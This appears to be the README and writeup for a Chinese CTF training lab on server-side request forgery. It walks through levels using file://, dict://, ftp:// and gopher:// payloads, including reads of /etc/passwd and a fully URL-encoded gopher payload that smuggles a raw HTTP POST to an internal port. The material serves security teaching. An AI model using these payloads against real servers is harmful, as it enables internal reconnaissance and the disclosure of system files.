# hello-ssrf
【Hello-CTF labs】靶场系列

算是 [ssrf-labs](https://github.com/ProbiusOfficial/ssrf-labs)  的前置靶场，介绍基本的协议，绕过方式以及攻击场景。

... 暂时先更新这么多，看我后续课程安排更新（

hello-world - 第一关 无过滤，主要了解file协议 

openwhat - 端口探测 

gopher_mirror - gopher协议特性 

gopher_master - gopher协议完成HTTP相关请求 

hostbypass - 简单绕过host限制 

whynotdomain - 域名绕过限制 

ohmyredis - 打redis 

ohmysql - 打mysql未授权  

## Usage

```bash
git clone https://github.com/ProbiusOfficial/hello-ssrf.git
cd hello-ssrf
docker-compose build
```
然后启动你想打的关卡（比如hostbypass）
```bash
docker run --rm -d -p 80:80/tcp hellossrf:hostbypass
```

## Writeup
### hello-world

同题目所说，该关卡没有任何过滤，主要用于熟悉ssrf中用到的各种协议。

这里我们先讲 `file://` 也就是file协议，其用法为 `file://+file_path` 该协议会输出对应文件的内容。

在ssrf攻击所在的内网中，其主要用于一部分信息的收集：

```bash
file:///etc/passwd        # 读取文件passwd
file:///etc/hosts         # 显示当前操作系统网卡的IP
file:///proc/net/arp      # 显示arp缓存表（寻找内网其他主机）
file:///proc/net/fib_trie # 显示当前网段路由信息
```

作为一个CTF题目，该关卡要求你通过file协议(file://)来读取位于根目录的flag文件(/flag)。

所以只需要在扫描框中输入 `file:///flag` 即可。

![image-20250220150150251](./assets/image-20250220150150251.png)

在 ssrf 中，除了file协议，我们还会讲到下面几个：

**dict / ftp 协议**

`ftp` 在SSRF中也常用于端口扫描，在遇到打开的端口时，响应速度会明显变慢。

```Bash
ftp://ip:prot
.Eg ftp://127.0.0.1:5001
```

`dict`协议用于访问字典服务资源，可用于内网端口探测，响应速度较快。

```Bash
dict://ip:prot
.Eg dict://127.0.0.1:5001
```

此外 dict 在 ssrf 中还可以用来攻击redis服务，这些我们会在后面遇到。

**gopher 协议**

gopher协议支持发出GET、POST请求，是ssrf利用中最强大的协议。

```Bash
gopher://<host>:<port>/<gopher-path>_<发送的TCP数据>
```

**http 协议** - 超文本传输协议，因特网最常见的协议，可以直接用于发起get请求。

**sftp / tftp 协议** - 更安全的文件传输协议 / 简单文件传输协议。

**ldap 协议** - 轻量级目录访问协议用于访问和操作目录服务。

### openwhat

前面说到 `dict`可用于内网端口探测，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口（或者一些有响应时间的端口），一般使用 BurpSuite 的迭代器模式爆破，设置好要爆破的 IP 和 端口 即可批量探测出端口。

为了减小容器体积，该关卡并没有采用真实服务，而是使用Python模拟的方式，监听了10000内的5个端口：

`81` `8082` `23`  `3309` `6380` `9001`

并且每个模拟开放端口有2s的响应等待时间，Flag为每个开放端口的回显消息，这里设置1-10000的迭代器爆破筛选回显消息即可。


### Gopher's mirror

**该关卡无Flag**

```
gopher 协议是一个古老且强大的协议，可以传递最底层的 TCP 数据流
本关卡无任何过滤，Python将监听81端口，你对该端口发送的所有TCP信息都会被镜像返回。
.eg:尝试通过gopher协议(gopher://)来向81端口发送消,gopher://host:port/gopher-path_TCP数据流,gopher://127.0.0.1:81/_hello_world!
```

演示关卡，你可以尝试不加_,直接这样去发送 gopher://127.0.0.1:81/TCP数据

然后你就会发现返回的数据丢了第一个字符，这就是为什么我们使用_占位。

### Gopher Master

```
记得么，HTTP 协议也是属于 TCP 数据层的，所以Gopher可以完成POST操作
你需要对原始POST请求完成下面加工：
1，移除Accept-Encoding: gzip, deflate
2，URL编码原始POST请求的所有字符
本关卡无任何过滤，Python将监听81 8181端口，你需要分别用get和post发送key=helloctf的参数来获取flag

.eg:gopher://127.0.0.1:8181/_数据流 | 如果使用浏览器发送一次编码即可，如果是burp，请使用两次。
```

如题目所示，题目主要考察如何使用 Gopher 来完成HTTP的请求操作。

以POST为例：

首先使用burpsuite去抓取一个 key=helloctf 的 http-post 原始请求包：

```
POST /ssrf.php HTTP/1.1
Host: localhost:8181
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

key=helloctf
```

移除压缩部分 - `Accept-Encoding: gzip, deflate, br` 后进行全字符URL编码：

<理论上要全字符URL编码，但是CyberChef的编码全部特殊字符也可以>

CyberChef

![image-20250220153810070](./assets/image-20250220153810070.png)

```
POST%20%2Fssrf%2Ephp%20HTTP%2F1%2E1%0D%0AHost%3A%20localhost%3A8181%0D%0Asec%2Dch%2Dua%3A%20%22Chromium%22%3Bv%3D%22121%22%2C%20%22Not%20A%28Brand%22%3Bv%3D%2299%22%0D%0Asec%2Dch%2Dua%2Dmobile%3A%20%3F0%0D%0Asec%2Dch%2Dua%2Dplatform%3A%20%22Windows%22%0D%0AUpgrade%2DInsecure%2DRequests%3A%201%0D%0AUser%2DAgent%3A%20Mozilla%2F5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121%2E0%2E6167%2E85%20Safari%2F537%2E36%0D%0AAccept%3A%20text%2Fhtml%2Capplication%2Fxhtml%2Bxml%2Capplication%2Fxml%3Bq%3D0%2E9%2Cimage%2Favif%2Cimage%2Fwebp%2Cimage%2Fapng%2C%2A%2F%2A%3Bq%3D0%2E8%2Capplication%2Fsigned%2Dexchange%3Bv%3Db3%3Bq%3D0%2E7%0D%0ASec%2DFetch%2DSite%3A%20none%0D%0ASec%2DFetch%2DMode%3A%20navigate%0D%0ASec%2DFetch%2DUser%3A%20%3F1%0D%0ASec%2DFetch%2DDest%3A%20document%0D%0AAccept%2DEncoding%3A%20gzip%2C%20deflate%2C%20br%0D%0AAccept%2DLanguage%3A%20zh%2DCN%2Czh%3Bq%3D0%2E9%0D%0AConnection%3A%20close%0D%0A%0D%0Akey%3Dhelloctf
```

Burpsuite：

```
%50%4f%53%54%20%2f%73%73%72%66%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%6c%6f%63%61%6c%68%6f%73%74%3a%38%31%38%31%0d%0a%73%65%63%2d%63%68%2d%75%61%3a%20%22%43%68%72%6f%6d%69%75%6d%22%3b%76%3d%22%31%32%31%22%2c%20%22%4e%6f%74%20%41%28%42%72%61%6e%64%22%3b%76%3d%22%39%39%22%0d%0a%73%65%63%2d%63%68%2d%75%61%2d%6d%6f%62%69%6c%65%3a%20%3f%30%0d%0a%73%65%63%2d%63%68%2d%75%61%2d%70%6c%61%74%66%6f%72%6d%3a%20%22%57%69%6e%64%6f%77%73%22%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%31%32%31%2e%30%2e%36%31%36%37%2e%38%35%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%37%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%61%76%69%67%61%74%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%55%73%65%72%3a%20%3f%31%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%64%6f%63%75%6d%65%6e%74%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%2c%20%62%72%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a%6b%65%79%3d%68%65%6c%6c%6f%63%74%66
```

然后将对应编码后的字符放在 gopher:// 协议下数据流部分,如果只进行一次url编码可以使用题目的扫描框:

```
gopher://127.0.0.1:8181/_%50%4f%53%54%20%2f%73%73%72%66%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%6c%6f%63%61%6c%68%6f%73%74%3a%38%31%38%31%0d%0a%73%65%63%2d%63%68%2d%75%61%3a%20%22%43%68%72%6f%6d%69%75%6d%22%3b%76%3d%22%31%32%31%22%2c%20%22%4e%6f%74%20%41%28%42%72%61%6e%64%22%3b%76%3d%22%39%39%22%0d%0a%73%65%63%2d%63%68%2d%75%61%2d%6d%6f%62%69%6c%65%3a%20%3f%30%0d%0a%73%65%63%2d%63%68%2d%75%61%2d%70%6c%61%74%66%6f%72%6d%3a%20%22%57%69%6e%64%6f%77%73%22%0d%0a%55%70%67%72%61%64%65%2d%49%6e%73%65%63%75%72%65%2d%52%65%71%75%65%73%74%73%3a%20%31%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%4d%6f%7a%69%6c%6c%61%2f%35%2e%30%20%28%57%69%6e%64%6f%77%73%20%4e%54%20%31%30%2e%30%3b%20%57%69%6e%36%34%3b%20%78%36%34%29%20%41%70%70%6c%65%57%65%62%4b%69%74%2f%35%33%37%2e%33%36%20%28%4b%48%54%4d%4c%2c%20%6c%69%6b%65%20%47%65%63%6b%6f%29%20%43%68%72%6f%6d%65%2f%31%32%31%2e%30%2e%36%31%36%37%2e%38%35%20%53%61%66%61%72%69%2f%35%33%37%2e%33%36%0d%0a%41%63%63%65%70%74%3a%20%74%65%78%74%2f%68%74%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%68%74%6d%6c%2b%78%6d%6c%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%6d%6c%3b%71%3d%30%2e%39%2c%69%6d%61%67%65%2f%61%76%69%66%2c%69%6d%61%67%65%2f%77%65%62%70%2c%69%6d%61%67%65%2f%61%70%6e%67%2c%2a%2f%2a%3b%71%3d%30%2e%38%2c%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%69%67%6e%65%64%2d%65%78%63%68%61%6e%67%65%3b%76%3d%62%33%3b%71%3d%30%2e%37%0d%0a%53%65%63%2d%46%65%74%63%68%2d%53%69%74%65%3a%20%6e%6f%6e%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%4d%6f%64%65%3a%20%6e%61%76%69%67%61%74%65%0d%0a%53%65%63%2d%46%65%74%63%68%2d%55%73%65%72%3a%20%3f%31%0d%0a%53%65%63%2d%46%65%74%63%68%2d%44%65%73%74%3a%20%64%6f%63%75%6d%65%6e%74%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%2c%20%62%72%0d%0a%41%63%63%65%70%74%2d%4c%61%6e%67%75%61%67%65%3a%20%7a%68%2d%43%4e%2c%7a%68%3b%71%3d%30%2e%39%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%0d%0a%6b%65%79%3d%68%65%6c%6c%6f%63%74%66
```

![image-20250220153424086](./assets/image-20250220153424086.png)

如果使用 burpsuite 就需要两次URL编码：

![image-20250220154959257](./assets/image-20250220154959257.png)

当然 GET 请求也可以使用对应的方法，过程同理，这里就不赘述了，只展示过程。

**编造包 -> 删压缩 -> URL编码 -> 拼接**

```
GET /?key=helloctf HTTP/1.1
Host: 127.0.0.1:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
```

### ohmysql

> ssrf打mysql看起来是18年的一个trick，估计是得益于后面安全性的升级，这个trick到现在也只停留在18年和ssrf靶场中（
>
> 即使在25年的今天去检索ssrf和sql，你依旧只能找到18年左右的文章，如果有现在的 —— 那多半是抄的18年那会的
>
> 不过还是翻出来一些有意思的底层，比如mysql协议分析.
>
> 一些推荐的文章：
>
> [【2016-05-31_长亭科技 - 利用 Gopher 协议拓展攻击面】](https://blog.chaitin.cn/gopher-attack-surfaces/) - 早啊 真早啊（）
>
> [【2018-01-10  Freebuf - 从一道CTF题目看Gopher攻击MySql】](https://www.freebuf.com/articles/web/159342.html) - mysql协议分析部分应该是文章的精髓了
>
> [【2018-01-23 Seebug - SSRF To RCE in MySQL】](https://paper.seebug.org/510/) - 在检索资料的时候，发现一堆人都从这抄的（（
>
> [【2021-01-14 Freebuf - CTF SSRF 漏洞从0到1】](https://www.freebuf.com/articles/web/260806.html) - 一篇时间比较近 还比较全面的

设计中 —— 由于时效性，该关卡最主要应该展示偏向过程一点的，如协议的展示分析，MySQL协议的TCP相关结构和传输过程。

该关卡目前已经没太大实战价值，但希望各位能从中收获一些做题之外的东西。



## 其他

SSRF 其他学习资源：

CTFShow系列题目 - 推荐WriteUp：https://tari.moe/2021/ctfshow-ssrf.html
